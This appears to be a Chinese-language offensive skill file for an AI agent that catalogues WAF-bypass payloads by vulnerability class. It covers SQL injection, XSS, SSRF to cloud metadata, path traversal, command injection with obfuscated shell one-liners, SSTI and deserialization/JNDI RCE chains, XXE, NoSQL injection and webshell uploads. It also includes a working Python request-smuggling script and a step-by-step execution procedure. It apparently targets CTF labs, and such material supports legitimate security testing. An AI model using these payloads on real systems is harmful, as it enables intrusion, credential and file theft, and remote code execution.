---
name: waf-bypass
description: >
  WAF/网关/字符过滤被拦(403/406/501/「非法字符」/参数消失)时的换载体手册。
  按漏洞类分节(SQLi/XSS/SSRF/LFI/命令注入/SSTI/XXE/NoSQL/上传/反序列化/CRLF),
  每节「拦什么特征→先试什么」;类内变形失效再走通用载体节(Content-Type 解析差/
  multipart/HTTP-2/chunked/垫长/charset 整段编码/HPP)。铁律:洞类不变,
  一次只改一种;这是查表工具,不是自由发挥材料。
---

# WAF 绕过 — 门拦了 ≠ 洞不存在

403 / 406 / 「非法字符」/ 参数被剥是**门**在拦字面特征。后端和 WAF 不是同一套解析器
(权威研究:上千条绕过里 payload 语义不变、只改结构/载体即可过门)。**洞类不变,
一次只改一种变形。**本环境无出网:不找源站 IP、不用 Collaborator/interactsh,回连只打攻击机内网 IP。

```
被拦请求 + 一个无害过门请求 → 对比,定位拦的是:路径?某关键字?整段 body?某头部?
  → 类内专用变形(§1–§11)从上往下,一种一验
  → 仍拦 → 通用载体(§G):换 parser / 协议 / 路径 / 头 / 垫长
  → 仍拦 → §G.6 整段编码(charset / overlong / NFKC)
```

**过门判定信号**:403→400/401(路由层过了,到了应用)/ 200 但内容变化 / 响应长度或
Set-Cookie 变化 / 报错信息换了一种。没看到信号=没过,不要叠加下一发,回退重对比。

## 0. 判层与索引

| 现象 | 先动 |
|---|---|
| 字面路径 403,编码路径变 401/400 | §G.4 路径变形 |
| body 某关键字触发 403,去掉该词 200 | 该类专用变形(§1–§11),后接 §G.1 换 parser |
| 整段 JSON/multipart 403,短 body 过 | §G.3 垫长 / §G.1 换 Content-Type |
| 只有某个头被拦 | §G.5 头 |
| GET 拦 POST 过(或反之) | 换方法 / `X-HTTP-Method-Override` |
| H1 拦 H2 过(或反之) | §G.2 协议 |

按类速查(拦什么 → 第一发换什么):

| 类 | 常拦特征 | 第一发 |
|---|---|---|
| SQLi | `'` `union` `select` `--` | `UN/**/ION` / `1e0union` / `CHAR()` / HPP 拆参数 |
| XSS | `<script` `onerror` `alert(` | 换标签换事件 / `alert\`1\`` / 实体编码 |
| SSRF | `127.0.0.1` `file:` `169.254` | `127.1` / 十进制 IP / `[::ffff:127.0.0.1]` |
| LFI | `../` `php://` `/etc/passwd` | 双重编码 / `....//` / wrapper 变形 |
| 命令注入 | `;` `\|` `cat` 空格 | `${IFS}` / glob `/???/??t` / base64 管道 |
| SSTI | `{{` `${` `__class__` | `{% %}` / `\x5f` / `\|attr()` / 换引擎括号 |
| XXE | `<!DOCTYPE` `SYSTEM` `ENTITY` | 参数实体 / PUBLIC / UTF-16 整体 |
| NoSQL | `$ne` `$gt` `$where` | JSON 体 / `[$ne]` 表单数组 / 换算子 |
| 上传 | `.php` `<?php` MIME | 双扩展 / 魔数 polyglot / Disposition 解析差 |
| 反序列化/JNDI | `rO0` `Tzo` `ldap://` `${jndi` | base64 变形 / 分块垫长 / `${${::-j}ndi}` |
| CRLF/重定向 | `%0d%0a` `//evil` | 单 `%0a` / `\/evil` / `@` / `.` 编码 |

---

## 1. SQLi

常拦:`'` `"` `union` `select` `from` `where` `--` `#` `and` `or` `sleep` `benchmark` `information_schema` `order` `by`。

**空白与关键字拆分(第一梯队)**

| 手法 | 例 |
|---|---|
| 注释当空白 | `UN/**/ION/**/SE/**/LECT/**/1,2,3` |
| MySQL 版本注释 | `/*!50000UNION*/ /*!50000SELECT*/`(带版本号 50000 兼容性最好) |
| 大小写混合 | `uNiOn SeLeCt` |
| 空白字节替换 | `%09` `%0a` `%0b` `%0c` `%0d` `%a0`(MySQL GBK 下 `%a0` 是合法空白) |
| 括号去空白 | `UNION(SELECT(1),2,3)` `WHERE(id=1)` |
| 科学计数粘连 | `1e0union select` `2e-1or` `1.1from` |
| 注释符变形 | `--` `--+` `--%0a` `#` `%23` `;%00`(看哪个真正截断) |

**逻辑等价(签名打在 `OR 1=1`/`AND 1=2`/`SLEEP` 上)**

| 拦 | 换(逐个试,不是一起上) |
|---|---|
| `OR 1=1` | `OR 2>1` `OR 'x'='x'` `OR 0x50=0x50` `\|\|1` `OR 1 IN(1)` `OR 1 LIKE 1` `OR 1 BETWEEN 0 AND 2` `OR 1 REGEXP '.'` |
| `AND 1=2` | `AND 1*0` `AND 0x30=0x31` `AND nullif(1,1)` `AND mod(29,9)=2` |
| `SLEEP(5)` | `BENCHMARK(50000000,SHA1('a'))` `GET_LOCK('x',5)`;PG `pg_sleep(5)`;MSSQL `WAITFOR DELAY '0:0:5'`;SQLite 笛卡尔积重查询 `LIKE` 连乘 |
| `information_schema.tables` | `mysql.innodb_table_stats` `sys.schema_table_statistics`(MySQL8);`sqlite_master`;PG `pg_catalog.pg_tables` |
| `UNION SELECT NULL` | `UNION ALL SELECT` `UNION SELECT 0` `UNION SELECT 34=35` `UNION SELECT char(null)` |

**去引号 / 编码(引号被拦)**

| 手法 | 例 |
|---|---|
| 字符串转 hex/CHAR | `0x61646d696e`(=`admin`)`CHAR(97,100,109,105,110)`;PG `CHR(97)\|\|…` 或 `$$admin$$`;MSSQL `CHAR`+`+` 拼接 |
| 双重 URL | `%2527`(%2527→%27→`'`);三重 `%252527` |
| JSON `\u` | `'` `union` |
| IIS `%u` 编码 | `%u0027` `%u0055nion`(仅 IIS 后端) |
| overlong/非法 UTF-8 | `%c0%a7` `%c0%27` `%ff%27`(GBK/多字节后端把尾字节吃掉还原引号;**发原始字节**,别按 UTF-8 编) |
| 引号内拼接 | `un'+'ion` `adm'in`(应用拼接时还原) |

**HPP/HPF(一条注入拆进多个参数,应用拼接时还原)**

- HPP 同名参数:`id=1;select+1&id=2,3+from+users--`(ASP 用 `,` 拼;JSP 取第一个,PHP 取最后一个——先各发一发探测谁生效)
- HPF 注释拼:`a=1+union/*&b=*/select+1,2,3--`(后端 `a+b` 拼接时还原)
- 引号跨参数:`a=1' AND '1'='&b=2`(把开引号留在 a,闭引号留给 b)

库差异速记:MySQL `/**/` `/*!*/` `#`;PG `$$` `::` `CHR`;MSSQL `;` 堆叠 `WAITFOR` `[]` 包标识符;SQLite `\|\|` `sqlite_master`。登录框注入手填 sqli.txt 里的万能密码变体,被拦套本节,不要上爆破。

## 2. XSS

常拦:`<script` `onerror` `onload` `javascript:` `alert(` `eval(` `document.cookie` `src=`。
**先定回显上下文再变形**(上下文判定见 web playbook §6.2;本节只管被拦后换载体)。

**上下文逃逸首选项**

| 上下文 | 被拦时换 |
|---|---|
| HTML 正文,`<img/svg` 被拦 | `<video src=x onerror=alert(1)>` `<audio src=x onerror=alert(1)>` `<body onload=alert(1)>` `<details open ontoggle=alert(1)>` `<input autofocus onfocus=alert(1)>` `<marquee onstart=alert(1)>` `<svg><animate onbegin=alert(1) attributeName=x></svg>` `<xss id=x tabindex=1 onfocus=alert(1)>` |
| 属性内,`">` 逃逸被剥 | `&quot;&gt;<svg onload=alert(1)>`(实体先解再出属性);单引号属性用 `'-alert(1)-'` |
| JS 字符串内,`</script>` 被拦 | `\x3c/script\x3e` `</script>`(JS 引擎内先解码);`alert` 换 `confirm/prompt/print`、`top[/al/.source+/ert/.source](1)` |
| href/src 值,`javascript:` 被拦 | `ja&#x76;ascript:alert(1)` `java\tscript:`(真 TAB 字节)`data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==` |

**去 `alert(` / 去括号 / 去引号**

| 手法 | 例 |
|---|---|
| 模板字符串 | `alert\`1\`` |
| fromCharCode | `eval(String.fromCharCode(97,108,101,114,116,40,49,41))` |
| atob | `eval(atob('YWxlcnQoMSk='))` |
| 拼接 | `window['ale'+'rt'](1)` `'ale'.concat('rt')(1)` |
| JS unicode/hex 拆函数名 | `alert(1)` `\x61lert(1)`(拆第一个字母即可,不用全拆) |
| throw 免括号 | `onerror=throw` + `throw` 语句(冷门,留最后) |

**编码链(按解码层倒推:WAF 看到原文,浏览器解码后执行)**

| 手法 | 例 |
|---|---|
| HTML 实体(属性值内) | `<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">`——属性值会先解实体再当 JS,实体只编 `alert` 四字母就够 |
| 前导零/无分号实体 | `&#00097;` `&#x61` |
| 标签名拆 | `<s%09cript>` `<scri%00pt>`(URL 层) |
| `/` 当空白 | `<svg/onload=alert(1)>` `<img/onerror=alert(1)//src=x>` |
| 大小写 + 垃圾 | `<sCrIpT/x>` `<img """><script>alert(1)</script>">` |
| 全角(NFKC 归一后端) | `＜svg onload=alert(1)＞`(仅当后端做 NFKC 归一) |

iframe srcdoc 载体(整段实体编码,专治标签黑名单):`<iframe srcdoc="&lt;svg onload=alert(1)&gt;">`。

## 3. SSRF

常拦:`127.0.0.1` `localhost` `0.0.0.0` `169.254` `file:` `gopher:` `dict:` `::1`。无出网:只打靶机自身/内网段/攻击机内网 IP。

**同一地址的写法矩阵(过滤器做字符串比较就死)**

| 手法 | `127.0.0.1` 写法 | `169.254.169.254` 写法 |
|---|---|---|
| 短点分 | `127.1` `127.0.1` | — |
| 整段环回 | `127.2.3.4`(整个 `127/8` 都是环回) | — |
| 十进制整数 | `2130706433` | `2852039166` |
| 十六进制 | `0x7f000001` `0x7f.0.0.1` | `0xa9fea9fe` |
| 八进制 | `0177.0.0.1` `017700000001` | `0251.0376.0251.0376` |
| 进制混拼 | `0x7f.0.0.1` 与 `127.0x0.0.1` 组合 | — |
| 溢出位 | `127.0.0.257`(部分栈按 %256 折叠成 .1) | — |
| `0` | `http://0/` `0.0.0.0` | — |
| IPv6 | `[::1]` `[0000::1]` `[::]` | `[::ffff:169.254.169.254]` |
| IPv4-mapped IPv6 | `[::ffff:127.0.0.1]` `[0:0:0:0:0:ffff:7f00:1]` | `[0:0:0:0:0:ffff:a9fe:a9fe]` |
| Unicode 点 | `127。0。0。1`(URL 编码 `%E3%80%82`,后端归一时还原) | 圈数字 `①②⑦.⓪.⓪.①` |

**解析器差异(who 认 host)**

| 手法 | 例 |
|---|---|
| userinfo `@` | `http://允许的域@127.0.0.1`(过滤器取 `@` 前当 host、实际连 `@` 后) |
| 反斜杠 | `http://127.0.0.1\@允许域` `http:\\127.0.0.1`(WHATWG 与 Java/Ruby 对 `\` 认知不同) |
| 碎片截断 | `http://127.0.0.1#@允许域` |
| 302 跳转 | 先请求白名单内 URL,该 URL 302 到 `127.0.0.1`(应用跟跳、过滤器不跟);本机可控的跳转点 = 靶机自身重定向接口 |
| DNS 形 | `localhost.<靶机域>`、`127.0.0.1.nip.io` 需出网,无出网禁用;改用 `localhost` 字面与 `/etc/hosts` 名 |
| scheme 变体 | `File:///etc/passwd` `fIlE:` `%66ile://`(大小写/编码);`file://localhost/etc/passwd` |

**协议矩阵(打内网服务)**

| scheme | 用途 |
|---|---|
| `gopher://127.0.0.1:6379/_…` | Redis 未授权 → 写 webshell/计划任务(payload 用 gopherus 离线生成,别手拼) |
| `dict://127.0.0.1:11211/…` | memcached 探信息 |
| `file:///flag` `file:///etc/passwd` | 直读(优先试这个再谈打服务) |
| `gopher://127.0.0.1:3306/…` `:25/` `:61616/` | MySQL/SMTP/ActiveMQ,依靶面 |

内网端口速查:6379 Redis / 3306 MySQL / 11211 memcached / 9200 ES / 2375 docker(直接 RCE)/ 8500 consul / 8080-8090 管理台。云形态:metadata 用上表编码 + `/latest/meta-data/`(AWS)/ GCP 加头 `Metadata-Flavor: Google` / Azure 加头 `Metadata: true`。

## 4. LFI / 路径穿越 / RFI

常拦:`../` `..\` `/etc/passwd` `php://` `file://` `data://`。

**穿越变形(逐行试,`root:` 出现即过门)**

| 手法 | 例 |
|---|---|
| 单次 URL 编码 | `%2e%2e%2f` `..%2f` `%2e%2e/` |
| 双重编码 | `%252e%252e%252f` `..%252f` |
| IIS `%u` | `%u002e%u002e%u002f` |
| overlong UTF-8 | `%c0%ae%c0%ae%c0%af` |
| 剥 `../` 的过滤器 | `....//` `..././`(剥一层剩一层)`..;/`(Tomcat 剥 `;`) |
| 混斜杠 | `..\..\..\etc\passwd`(Windows)`..\/` `//` |
| 绝对路径直给 | `/etc/passwd` `/proc/self/environ` `/proc/self/cwd/app.py` `/proc/1/cmdline` |
| 空字节截断(老 PHP) | `/etc/passwd%00` `/etc/passwd%00.jpg` |
| 尾缀挤出 | `/etc/passwd.` `/etc/passwd%20`(Windows 尾点尾空格) |
| 超长路径 | 把强制拼接的后缀 `.jpg` 挤出 4096 字节被截断(垫 `/./` 循环) |

**PHP wrapper 变形**

| 手法 | 例 |
|---|---|
| 大小写混 | `pHp://FilTer/convert.base64-encode/resource=index` |
| 冒号编码 | `php%3a//filter/…` 双重 `php%253a%252f%252f` |
| 读源码三连 | `convert.base64-encode` `string.rot13` `convert.iconv.utf-8.utf-16`(出一个就行) |
| wrapper 矩阵 | `php://input`(POST 体当文件,`allow_url_include` 开时 RCE)`data://text/plain;base64,…` `expect://id` `zip://` `phar://` `glob://` |
| filter chain RCE | 无需目标文件、纯 filter 链造 RCE——用离线 generator(查 /opt/knowledge)生成,不要手算 |

LFI→RCE 四板斧(日志投毒/会话文件/proc environ/phpinfo race)见 web playbook §6.4。RFI:`http://` 拦了试双重编码与 `ftp://`;无出网一律指向攻击机内网 IP 起的 `python3 -m http.server`。

## 5. 命令注入 / RCE

常拦:`;` `|` `&` `` ` `` `$()` 空格 `cat` `ls` `id` `whoami` `/etc` `/bin` `bash` `curl` `wget`。

**分隔与空白(第一梯队)**

| 手法 | 例 |
|---|---|
| 分隔符矩阵 | `;id` `\|id` `\|\|id` `&&id` `&id` `%0a id`(换行最常漏拦)`` `id` `` `$(id)` |
| 空格 → IFS | `cat${IFS}/etc/passwd` `cat$IFS$9/etc/passwd` |
| 空格 → tab | `%09` |
| 花括号展开 | `{cat,/etc/passwd}` |
| 重定向当输入 | `cat</etc/passwd` `cat<>/etc/passwd` |

**关键字/路径伪装**

| 手法 | 例 |
|---|---|
| glob 逐字 | `/???/??t /???/??ss??`(=`/bin/cat /etc/passwd`)`/e*c/p*sswd` `cat /fla*` |
| 插引号 | `ca''t /e'tc/pa'sswd` `w"h"hoami` `c'a't` |
| 反斜杠插字 | `c\at` `who\ami` |
| `$@` | `cat$@ /etc/passwd` |
| 变量切片拼特殊字 | `${PATH:0:1}`(=`/`)`${HOME:0:1}`;`;` 可从 `${LS_COLORS:10:1}` 碰 |
| rev/tr 变形 | `$(rev<<<'imaohw')` `$(tr A-Z a-z<<<'WHOCARES')` |
| base64 全包 | `echo${IFS}Y2F0IC9mbGFnKg==\|base64${IFS}-d\|sh` |
| printf 十六进制 | `$(printf '\x69\x64')` `$0<<<$'\x63\x61\x74'` |
| here-string 免管道 | `sh<<<$(base64 -d<<<Y2F0IC9mbGFnKg==)` |

Windows:`^` 转义(`wh^o^ami`)、`cmd /c`、PowerShell `powershell -enc <base64>`(UTF-16LE 编码:`iconv -f utf-8 -t utf-16le <<< 'cat C:\flag*' \| base64 -w0`)。拿到执行先 `find / -maxdepth 2 -name '*flag*'`;无出网外带三板斧见 web playbook §6.5。

## 6. SSTI

常拦:`{{` `}}` `${` `<%` `__class__` `__mro__` `config` `request` `os` `popen`。

**先让探针过门(探针本身也要最小化,别一发丢完整 RCE 链)**

| 拦 | 换探针 |
|---|---|
| `{{7*7}}` | `{% set x=7*7 %}{{x}}` `{ {{7*7}} }`(借已有花括号)`%7b%7b7*7%7d%7d` JSON `{{7*7}}` |
| 换引擎语法 | `${7*7}` `<%= 7*7 %>` `{7*7}` `*{7*7}` `#{7*7}`(换括号本身就是绕过) |

**类名双下划线被拦**

| 手法 | 例 |
|---|---|
| `\x`/`\u` 转义(Python 字符串层) | `{{lipsum.__globals__}}` 被拦 → `{{lipsum\|attr('\x5f\x5fglobals\x5f\x5f')}}` |
| attr + 参数外带(黄金手段) | `{{request\|attr(request.args.a)}}` 且 `?a=__class__`——关键字全放另一个参数,本参数零关键字 |
| 拼串 | `{{lipsum['__gl'+'obals__']}}` |
| `.` 被拦 | `['...']` 取属性:`{{lipsum['__globals__']}}` |
- 引擎 RCE 链与探针树见 web playbook §6.6;`lipsum.__globals__.os` / `cycler.__init__.globals` / `config` 都是 Jinja2 入口,拦一个换一个。Twig:老版 `_self.env.registerUndefinedFilterCallback('exec')`;新版 `['id']|map('system')`。Smarty:`{system('id')}` / `{self::getStream(...)}`。Freemarker:`<#assign x="freemarker.template.utility.Execute"?new()>${x("id")}`。

## 7. XXE

常拦:`<!DOCTYPE` `<!ENTITY` `SYSTEM` `PUBLIC` `file://` `DOCTYPE` 整词。XML 优先改**结构/编码**,payload 语义不动。

| 手法 | 例 |
|---|---|
| 换实体种类 | 一般实体被拦换参数实体:`<!ENTITY % f SYSTEM "file:///flag">%f;`(注意 `%` 要在内部子集外用还需外部 DTD,内部子集里用 `&#37;` 变体) |
| PUBLIC 顶 SYSTEM | `<!ENTITY % f PUBLIC "//x" "file:///flag">` |
| 空白/换行拆声明 | `<!DOCTYPE\nr\n[\n<!ENTITY\nx\nSYSTEM\n"file:///flag"\n]>` |
| 大小写 | `<!doctype` `<!entity`(XML 声明大小写不敏感,部分 WAF 忘了) |
| 编码实体拆词 | `&#83;YSTEM`?——**不行**(实体展开发生在解析后期,WAF 也不认);正确做法是 CDATA 包内容或整体换编码 |
| 整体换编码 | `iconv -f utf-8 -t utf-16be x.xml > x16.xml` + `Content-Type: application/xml; charset=utf-16`——WAF 按 ASCII 扫必失明 |
| 前导垃圾 | `<?xml` 前塞空格/注释/BOM(懒 WAF 只锚开头);声明里塞 `standalone="yes"` 无害变体 |
| 错闭合/多 DOCTYPE | 尾部多一个 `]`、两个根节点(有时后端容错、WAF 先崩) |
| 换载体 | SVG 上传内嵌 DTD、XLSX/DOCX(zip 内 `[Content_Types].xml`)、SOAP `application/soap+xml`、XInclude(`<xi:include parse="text" href="file:///flag"/>)` 免 DOCTYPE——**XInclude 是 DOCTYPE 被全拦时的首选** |

无出网盲 XXE 报错外带(payload 见 web playbook §6.7:参数实体嵌套 → `file:///noexist/%内容` 触发报错带内容)。禁外部 DTD URL。

## 8. NoSQL

常拦:`$ne` `$gt` `$regex` `$where` `$or` `%24`。很多 WAF 只扫 querystring 的 `$`,JSON 体漏扫。

| 手法 | 例 |
|---|---|
| 换载体 | `?user[$ne]=x` 拦 → `Content-Type: application/json` 发 `{"user":{"$ne":""}}`(反之亦然) |
| 换算子 | `$ne` 拦 → `$gt:""` `$gte:""` `$nin:[]` `$exists:true` `$in:[null]` |
| 换注入位 | query 拦 → Cookie(`Cookie: user[$ne]=x`)/ JSON body / 多层嵌套 `{"user":{"password":{"$ne":""}}}` |
| `$` 编码 | `%24ne` `$ne`(JSON) |
| `$where` 变形 | `{"$where":"this.password.match(/^a/)"}` 拦 → `{"$where":"Obj"+"ect.keys(this)"}`(JS 串内拼接) |
| 重复键 | `{"user":"safe","user":{"$ne":""}}`(前后端取键顺序差) |

盲枚举工作流(`$regex` 逐字符,登录响应码/长度当 oracle,循环命令见 web playbook §6.8)。

## 9. 文件上传

WAF 和后端各看一份 `filename` / part `Content-Type` / boundary——**三个都做差**。

| 拦 | 换 |
|---|---|
| 扩展名 `.php` | `.php5` `.phtml` `.phar` `.pht` `.php.jpg` `.php.`(尾点)` Php`(大小写)`.php%00.jpg` `.php;.jpg`(IIS 分号)`.php::$DATA`(NTFS)`.shtml` `.svg`(XSS 路线) |
| MIME(part 头) | part 上写 `image/jpeg` `image/png` `application/octet-stream`(文件内容不动);`Content-Type:` 后插 TAB/多余空格 |
| 内容检测 | 魔数 polyglot:`GIF89a` 前缀 + 换行 + `<?php …`;`\xff\xd8\xff` JPEG 头;`\x89PNG`——保留图片头部字节,脚本接在注释段(`\x00\x01` 后) |
| `<?php` 关键字 | 短标签 `<?=`;`<?` + `echo \`cat /flag*\`;`(短 echo);脚本藏 EXIF:`exiftool "-comment<=shell.php" img.jpg` |
| `filename=` 解析差 | 双写 `filename=`(WAF 取一个后端取另一个);`filename="a.php "`(尾空格);RFC2231 `filename*=UTF-8''a.php`;`name="f\x00"`;单双引号混用 |
| Content-Disposition | 整行双写;行内插 TAB:`Content-Disposition:\tform-data`;per-part `Content-Transfer-Encoding: base64`(body 转码后 WAF 看不懂) |
| boundary | `boundary*0=fake;boundary*1=real`(RFC2231 续参,WAF 吃 fake);boundary 值加引号/`;`/`\x00`;详见 §G.1 |

服务端扩展:传 `.htaccess`(`AddType application/x-httpd-php .jpg`)+ jpg 马双响;传 `.user.ini`(`auto_prepend_file=shell.jpg`)+ 等刷新。确认执行与取 flag 见 web playbook §6.9。

## 10. 反序列化 / JNDI

| 拦 | 换 |
|---|---|
| Java base64 `rO0AB` | URL 单/双编码 `%72%4f%30%41%42` → `%2572%254f...`;**gzip+base64**(`H4sI` 开头,生成时 `\| gzip \| base64 -w0`)换指纹;raw hex 走 body;HTTP 层分块(§G.2)切关键字 |
| 反序列化 body 的 Content-Type | `application/x-java-serialized-object` ↔ `application/octet-stream` ↔ `text/plain` ↔ JSON 载体轮换 |
| PHP `Tzo` / `O:` | base64 换 `?`+URL 编码;`C:` 自定义序列化(部分过滤器只认 `O:`);PHP 7.2+ 大小写不敏感类名 `o:8:` |
| Python `gASV` | pickle 换协议 0(ASCII 流,内容变文本)——生成时 `pickle.dumps(obj, protocol=0)`,反而好过 WAF |
| `${jndi:ldap://` | 嵌套 `${${::-j}ndi:ldap://x}` `${${lower:j}ndi:…}` `${jndi:${::-l}${::-d}ap://…}`;大小写 `jNdI`;`ldap`→`rmi`→`dns`→`iiop` 轮换 |
| `ldap://` 字面 | `ldaps://` `//<ip>:1389/<path>`(协议省略);URI 只需连通,真实 gadget 放 LDAP 响应里 |
| gadget 类名在流量里 | ysoserial 生成时选 UTF-16/加密外层的变体;或 base64 嵌套在 JWT/Cookie 再解,绕流量扫描 |

生成命令(魔数速判与 ysoserial/pickle 一行生成器)见 web playbook §6.10,本节只管被拦后的变形。本机 rogue-jndi + java8/java11 双 JDK 起服务。

## 11. CRLF / 开放重定向

| 类 | 常拦 | 变形 |
|---|---|---|
| CRLF 注入 | `%0d%0a` | 单 `%0a` 或单 `%0d`(很多校验只防完整对);双重 `%250d%250a`;overlong UTF-8 `%E5%98%8A%E5%98%8D`(解回 U+2028/U+2029 行分隔,U+2028 在 JS 上下文即换行);TAB 拼接 `%0d%0a%09`;HTTP/2 下 `\r\n` 直接塞头值(H2 允许,H1 落地时还原) |
| 开放重定向 | `//evil` `http://evil` | `/\evil` `\/\/evil` `https:%2f%2fevil` `///evil` `https://白名单@evil` `https://evil#https://白名单` `https://白名单.evil` `.evil`(子域后缀)`%2f%5cevil.com` |

只指向靶机/攻击机内网 IP,重定向主要价值是当 SSRF 跳板与 `javascript:` 载体。

---

## G. 通用载体(类内变形失效后,payload 原样不动,换容器)

WAF 按声明选 parser;选错 parser 就不会查真正的字段。后端 urlencoded 与 multipart 常是同一套 API(野外 >90% 互通)。

### G.1 Content-Type / 解析差(性价比最高,先试这里)

**同一组字段换容器(payload 原样搬)**

| 容器 | 头 |
|---|---|
| urlencoded | `application/x-www-form-urlencoded` |
| JSON | `application/json` `application/ld+json` `text/json` |
| multipart | `multipart/form-data` 与 `multipart/mixed` 轮换 |
| XML | `application/xml` `text/xml` `application/soap+xml` |
| 省略 | 不发 Content-Type(部分 WAF 直接不查 body) |
| 生造 | `text/plain` `application/x-custom`(部分后端按体嗅探照收) |
| 错配 | JSON 体 + urlencoded 头(后端嗅探体时命中) |
| 双头 | 发两个 Content-Type:WAF 认第一个、后端认最后一个(或反之,两头都试) |
| charset 截断 | `application/json; charset=utf-8; boundary=x`——部分 parser 见到 charset 就停,后续参数不解析 |

**JSON 严格度差(WAF 严、后端松)**

- 注释打断:`{"id":1/*x*/, "q":"<payload>"}` 或 `{"id":1//x\n}`
- 重复键:`{"q":"safe","q":"<payload>"}`(两头取键顺序差,各发一发)
- 键名插 `\x00`:`{"q\x00":"..."}`
- `\uXXXX` 逐字母逃(不是只逃尾字母):`union`
- 深嵌套超 WAF 递归上限:`{"a":{"a":{"a": … {"q":"<payload>"} …}}}`(15-30 层)
- JSON5 松语法:单引号键、尾逗号、`+` 前缀数字 `{"id":1e0}`(WAF 的 JSON parser 直接解析失败→fail-open)

**multipart 结构肥(逐条试)**

- RFC2231 续参假 boundary:`boundary=fake; boundary*0=real-; boundary*1=b`(WAF 吃 `fake`,后端拼出 `real-b`)
- 双 `boundary=`、引号包裹、boundary 内 `;`/`\x00`/超长
- `--boundary` 前的 CRLF 去掉 / 混用 `\n` 与 `\r\n`
- 恶意 charset 放第一个 part,末 part 用 utf-8(不少规则只校验最后一个)
- part 头 `Content-Type: image/jpeg`(当二进制跳过检测)
- 终结 boundary `--b--` 之后**再跟一个 part**(部分 parser 继续解析)
- `Content-Disposition` 双 `name=`/`filename=`、`name="f\x00"`

### G.2 协议(整段 body 从 WAF 眼皮底下走)

**HTTP/1.1 原始构造 snippet(直接改用,别手写 socket 出错):**

```python
#!/usr/bin/env python3
# exp.py — 三种"body 消失"载体,HOST/PORT/PAYLOAD 三处替换
import socket
HOST, PORT = "IP", PORT_N
def send(raw):
    s = socket.create_connection((HOST, PORT)); s.sendall(raw)
    r = b""
    while True:
        d = s.recv(4096)
        if not d: break
        r += d
    print(r[:400].decode(errors="replace")); s.close()

body = b"q=<PAYLOAD>"                       # 1) chunked 切关键字:把 payload 拆进两个 chunk
c1, c2 = body[:6], body[6:]
send(b"POST / HTTP/1.1\r\nHost: h\r\nTransfer-Encoding: chunked\r\n\r\n"
     + hex(len(c1))[2:].encode() + b"\r\n" + c1 + b"\r\n"
     + hex(len(c2))[2:].encode() + b"\r\n" + c2 + b"\r\n0\r\n\r\n")

# 2) CL+TE 并存(前端按 TE、后端按 CL 或反之,两头版本都发)
full = b"q=x&junk=" + body
send(b"POST / HTTP/1.1\r\nHost: h\r\nContent-Length: " + str(len(full)).encode()
     + b"\r\nTransfer-Encoding: chunked\r\n\r\n"
     + hex(len(full))[2:].encode() + b"\r\n" + full + b"\r\n0\r\n\r\n")

# 3) GET 带 body(前端忽略 body,后端解析)
send(b"GET / HTTP/1.1\r\nHost: h\r\nContent-Length: " + str(len(body)).encode()
     + b"\r\n\r\n" + body)
```

更多 H1 变形:chunk 尺寸写法 `05`/`5 `/`5\t`/大写 hex;TE 值变形 `chunked `/`xchunked`/`"chunked"`/大小写;`Transfer-Encoding:\r\n chunked`(折行);两个 `Content-Length` 或值带 `+13`/尾空格;请求行前多一个 CRLF;方法小写 `post`。

**HTTP/2**(`curl --http2-prior-knowledge -v --data-binary @body --header …` 造基本帧;复杂帧用 python `h2` 库):

- **HEADERS 先发、DATA 延迟 200-500ms 再发**:外置 WAF 只看到头就放行——H1 同 payload 403 而 H2 过,就是这类
- H2→H1 降级注入:头值里塞 `\r\ntransfer-encoding: chunked`(H2.CL/H2.TE 走私)
- payload 放 `:path` 伪头(WAF 只扫普通头)
- h2c 升级:`Upgrade: h2c` + `HTTP2-Settings`,升级后字节 WAF 不再看

### G.3 长度 / 压缩 / 位置

- **检查窗口垫长**:payload 放 8KB(AWS 常见窗口)/16KB/64KB 之后——JSON 先放无害大字段,multipart 先垫大文本 part
- `Content-Encoding: gzip`(真压缩:WAF 不解、后端解):`printf '%s' "$body" \| gzip \| curl --data-binary @- -H 'Content-Encoding: gzip' …`;生造 `Content-Encoding: random` 部分栈直接 fail-open
- 关键字拆进相邻两个 chunk / 两个 JSON 字符串(后端拼接还原)

### G.4 路径与查询串(字面路径 403 → 401/400 即过门)

- 单字节 `%61`、双重 `%2561`、三重 `%252561`
- `/./` `//` `///` `/.` `/;junk`(Tomcat 剥 `;` 后拼回)`\` 当 `/`(IIS/WHATWG)
- `%00` 截断;尾 `.` 尾 `%20`(Windows)
- 路径里 `%3f`(WAF 当路径的一部分,后端当 query 分隔)与 `%23`
- 大小写 `/AdMin`、Unicode 兼容形 `／` `‥`

### G.5 头

- 头名大小写变形 `Content-Type`/`content-type`/`CONTENT-TYPE`
- 重复头(WAF 拼接、后端取最后,或反之——两头序都试)
- payload 挪进少查的头:`Referer` `X-Forwarded-For` `X-Original-URL: /admin/real` `X-Rewrite-URL` `X-Forwarded-Host`
- 方法覆盖:`X-HTTP-Method-Override: POST` / `_method=POST`(GET 传 payload,后端按 body 处理)

### G.6 整段编码(载体过了、关键字仍拦,才用;每次只挑一行)

| 手法 | 例 |
|---|---|
| charset 整段(最有力) | `iconv -f utf-8 -t ibm037 body.txt > body.enc && curl --data-binary @body.enc -H 'Content-Type: application/x-www-form-urlencoded; charset=ibm037'`(同样可 `utf-16le` `utf-7` `ebcdic` 系) |
| 双重/三重 URL | `%2527` `%252527` |
| IIS `%u` | `%u0027` `%u003C` |
| overlong UTF-8 | `%c0%a7`(=`'`)`%c0%ae`(=`.`)`%c0%bc`(=`<`,仅老解析器) |
| 非法 UTF-8 引号 | 原始字节 `%ff%27` `%c0%27`(多字节后端还原;发原始字节,不要按 UTF-8 规则编 U+00FF) |
| 空字节切词 | `uni%00on` `<scri%00pt>` |
| 空白字节 | `%09` `%0b` `%0c` `%0d` `%a0` `/**/` |
| NFKC 兼容形 | 全角 `＜` `＝` `／` `‥`(后端归一成 ASCII;先发一发探针确认后端会归一) |

### G.7 HPP / HPF 通用化

§1 的同名参数/注释拼接拆法对**任何**"WAF 只检查第一个同名参数、后端拼接或取最后一个"的注入都通用:XSS 事件属性、SSRF URL、LFI 路径、SSTI 表达式同样可拆进两个参数。

---

## 执行程序(逐条照做)

1. 保存**成对**请求:被拦的 + 去掉可疑关键字能过门的。对比定层(§0 表)。
2. 锁洞类 → 对应节从上往下,一种变形一发,看过门信号(§0 定义)。过了再加下一刀。
3. 类内变形扫完仍拦 → §G.1 换 Content-Type 轮一圈 → §G.2 协议 → §G.3 垫长 → §G.6 编码。
4. 每个 payload 变体记录状态码与响应长度(tmp/ 留痕);`exp.py` 存 tmp/。
